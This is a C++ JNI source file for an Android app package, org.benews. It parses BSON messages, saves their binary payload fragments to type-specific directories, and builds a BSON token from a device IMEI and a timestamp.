/*
 * =====================================================================================
 *
 *       Filename:  bson.cpp
 *
 *    Description:  library to parse and serialise bson stream
 *
 *        Version:  1.0
 *        Created:  15/10/2014 16:11:22
 *       Revision:  none
 *       Compiler:  gcc
 *
 *         Author:  zad
 *   Organization:  ht
 *
 * =====================================================================================
 */

#include "bson.h"
#include "libsonDefine.h"

#include "bson_obj.h"
#include <string>
#include <fstream>

#include <unistd.h>
#include <android/log.h>
#include <sys/stat.h>
#include <boost/filesystem/path.hpp>
#include <boost/filesystem.hpp>
char tag[256];
#define logd(...) {\
tag[0]=tag[1]=0;\
snprintf(tag,256,"libbsonJni:%s",__FUNCTION__);\
__android_log_print(ANDROID_LOG_DEBUG, tag , __VA_ARGS__);}
using namespace std;
using namespace bson;


int file_exist(string file){
  struct stat results;
  if (!file.empty() && stat(file.c_str(), &results) == 0){
    return 1;
  }
  return 0;
}

int check_dir(string dirPath){
  if(!dirPath.empty()){
    if (file_exist(dirPath)){
      return 0;
    }else
    {
      boost::filesystem::path dir((const char *)dirPath.c_str());
      if(boost::filesystem::create_directory(dir))
      {
        return 0;
      }
    }}
  return 1;
}
/*
 * saves a file payload in the correct place
 *
 * returns: 1 in case of error
 * returns: 0 in case of success
 */

int save_payload(string filename, char* payload, int payloadSize){
  int result=1;
  if(payload!=NULL && !filename.empty() && payloadSize>0){
    ofstream file(filename.c_str(), ios::out | ios::binary);
    file.write ((const char*)payload, payloadSize);
    file.close();
    result = !file_exist(filename);
  }
    return result;
}


string getTypeDir(int type){
  string dirName ;
  switch(type){
  case TYPE_TEXT:
    return TYPE_TEXT_DIR;
  case TYPE_AUDIO:
    return TYPE_AUDIO_DIR;
  case TYPE_IMGL:
    return TYPE_IMG_DIR;
  case TYPE_VIDEO:
    return TYPE_VIDEO_DIR;
  case TYPE_HTML:
    return TYPE_HTML_DIR;
  default:
    break;
  }
  return dirName;
}

/*
 * Returns: a filename for the type,ts,and fragment of a file.
 * empty sting in case of error
 */


string getFileName(string baseDir,int type,long int ts,int fragment){
  string filename ;
  logd("basedir.e=%d type=%d ts=%ld fragment=%d ",baseDir.empty(),type,ts,fragment);
  if(!baseDir.empty() && type>0 && ts>=0 && fragment>=0 && !getTypeDir(type).empty()){
    string type_dir=  baseDir + "/" + getTypeDir(type);
    if(check_dir(type_dir)==0){
      filename = type_dir + "/" + boost::lexical_cast<std::string>(ts) + "_" + boost::lexical_cast<std::string>(fragment);
      logd("filename=%s",filename.c_str());
    }
  }

  return filename;
}


/*
 * saves the payload in the correct place and format
 *
 * returns: 1 in case of error
 * returns: 0 in case of success
 */

int save_payload_type(string baseDir,int type,long int ts,int fragment,char* payload, int payloadSize){
  int result=1;
  logd("payload %p basedir.e?=%d payloadSize=%d",payload,baseDir.empty(),payloadSize);
    if(payload!=NULL && !baseDir.empty() && payloadSize>0){
      result = save_payload(getFileName(baseDir,type,ts,fragment),payload,payloadSize);
    }
    logd("result=%d",result);
    return result;
}


void GetJStringContent(JNIEnv *AEnv, jstring AStr, std::string &ARes) {
  if (!AStr) {
    ARes.clear();
    return;
  }
  const char *s = AEnv->GetStringUTFChars(AStr,NULL);
  ARes=s;
  AEnv->ReleaseStringUTFChars(AStr,s);
}



//char bson_s[] = { 0x16,0x00,0x00,0x00,0x05,'s','a','l','u','t','o',0x00,0x04,0x00,0x00,0x00,0x00,'c','i','a','o',0x0 };
/*
0x35 0x0 0x0 0x0
0x5
0x63 0x6d 0x64 0x0
0x4 0x0 0x0 0x0
0x0
0x73 0x61 0x76 0x65
0x10
0x74 0x79 0x70 0x65 0x0
0x1 0x0 0x0 0x0
0x5
0x70 0x61 0x79 0x6c 0x6f 0x61 0x64 0x0
0xa 0x0 0x0 0x0
0x0
0x63 0x69 0x61 0x6f 0x20 0x6d 0x6f 0x6e 0x64 0x6f 0x0
*/
JNIEXPORT jstring JNICALL Java_org_benews_BsonBridge_serialize(JNIEnv *env, jclass obj, jstring basedir, jbyteArray bson_s)
{
  logd("serialize called");
  jstring resS=NULL;
  jbyte* arry = env->GetByteArrayElements(bson_s,NULL);
  if(arry!=NULL){
    jsize lengthOfArray = env->GetArrayLength(bson_s);
    logd("converted %d:",lengthOfArray);
    //for (int i=0 ; i < lengthOfArray; i++){
    //logd("->0x%x",(char *)a[i]);
    //}
    if(lengthOfArray>4){
      bo y = BSONObj((char *)arry);
      be *ptr;
      string res ;
      int element=0;
      string value;
      be ts=y.getField("ts");
      logd("got elemets");
      if(ts.size()>0 && ts.type()==NumberLong){
        ptr=&ts;
        logd("got ts");
        value = boost::lexical_cast<std::string>(ptr->Long());
        res += boost::lexical_cast<std::string>(ptr->fieldName())  + "=" + value + "\n";
        logd("result %s",res.c_str());
        element++;
      }
      be type=y.getField("type");
      if(type.size()>0 && type.type()==NumberInt){
        ptr=&type;
        logd("got type");
        value = boost::lexical_cast<std::string>(ptr->Int());
        res += boost::lexical_cast<std::string>(ptr->fieldName())  + "=" + value + "\n";
        logd("result %s",res.c_str());
        element++;
      }
      be frag=y.getField("frag");
      if(frag.size()>0 && frag.type()==NumberInt){
        ptr=&frag;
        logd("got frag");
        value = boost::lexical_cast<std::string>(ptr->Int());
        res += boost::lexical_cast<std::string>(ptr->fieldName())  + "=" + value + "\n";
        logd("result %s",res.c_str());
        element++;
      }
      be payload=y.getField("payload");
      if(payload.size()>0){
        ptr=&payload;
        logd("got payload");
        //int a;
        //value = boost::lexical_cast<std::string>(ptr->binData(a));
        //value = value.substr(0,a);
        //res += boost::lexical_cast<std::string>(ptr->fieldName())  + "=" + value + "\n";
        //logd("result %s",res.c_str());
        element++;
      }

      if(element==ELEMENT2PROCESS){
        string basedir_str;
        GetJStringContent(env,basedir,basedir_str);
        logd("returning %s",res.c_str());
        int a;
        const char *payloadArray=payload.binData(a);
        if(save_payload_type(basedir_str,type.Int(),ts.Long(),frag.Int(),(char *)payloadArray,a)==0){
          res =  getFileName(basedir_str,type.Int(),ts.Long(),frag.Int());
        }
        resS = env->NewStringUTF(res.c_str());


      }
      env->ReleaseByteArrayElements(bson_s,arry, JNI_ABORT);

    }
  }
  if(resS==NULL){
    resS = env->NewStringUTF("Fails");
  }
  return  resS;
}



JNIEXPORT jbyteArray JNICALL Java_org_benews_BsonBridge_getToken(JNIEnv * env, jclass, jint imei, jint ts){
  bob bson;
  bson.append("imei",imei);
  bson.append("ts",ts);
  bo ret =bson.done();
  jbyteArray arr = env->NewByteArray(ret.objsize());
  env->SetByteArrayRegion(arr,0,ret.objsize(), (jbyte*)ret.objdata());
  return arr;
}

